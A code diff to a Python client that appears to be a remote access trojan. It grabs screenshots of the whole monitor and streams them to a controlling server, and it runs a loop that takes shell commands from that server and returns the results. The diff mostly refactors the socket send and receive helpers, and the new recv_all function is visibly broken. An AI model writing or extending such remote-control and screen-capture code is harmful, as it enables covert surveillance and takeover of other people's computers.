@@ -13,19 +13,39 @@ def take_screen_shot():
     if len(mss.mss().monitors) > 0:
         raw_pixels = mss.mss().grab(mss.mss().monitors[0])
         img_data = mss.tools.to_png(raw_pixels.rgb, raw_pixels.size, 0)
-        file_size = str(len(img_data)) + "\n"
-        server_con.send(file_size.encode())
-    
-        server_con.sendall(img_data)
+        send_all(img_data)
+
         del(raw_pixels, img_data)
 
-def send_file(file_path):
-    pass
+def recv():
+    return server_con.recv(1024)
+
+def recv_all():
+    data_size = int(server_con.recv(8).decode())
+    print(data_size)
+
+    data = bytes()
+    data_received_count = 0
+    while data_received_count < data_size:
+        data = server_con.recv(1024)
+        if not data_received_count:
+            break
+        data_received_count += len(data)
+
+    return data
+
+def send(data):
+    server_con.send(data)
+
+def send_all(data):
+    data_size = f"{str(len(data))}\n"
+    server_con.sendall(data_size.encode())
+    server_con.sendall(data)
 
 def open_shell():
     while True:
         print("waiting for cmd...")
-        data = server_con.recv(1024)
+        data = recv()
         str_msg = b""
 
         if data.decode() == "exit":
@@ -45,9 +65,10 @@ def open_shell():
             str_msg = b"Error!"
 
         if not str_msg:
-            str_msg = b" "
+            str_msg = b"\n"
 
-        server_con.sendall(str_msg)
+        send(str_msg)
+
 
 
 
